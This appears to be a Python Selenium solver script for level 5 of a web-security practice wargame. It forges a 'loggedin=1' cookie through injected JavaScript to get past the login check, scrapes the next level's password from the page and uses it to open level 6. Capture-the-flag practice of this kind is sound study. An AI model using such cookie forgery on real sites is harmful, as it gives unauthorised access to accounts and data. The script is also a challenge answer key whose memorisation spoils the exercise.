from common import *

def solve(driver, _ = None):
    driver.get(build_url(level=5))
    
    # fake logged in
    driver.execute_script('document.cookie = "loggedin=1"')
    driver.get(build_url(level=5))
    
    text = driver.find_element(By.XPATH, '//*[@id="content"]').text
    password = text[text.find("is ")+3:]
    
    driver.get(build_url(password = password, level=6))
    return password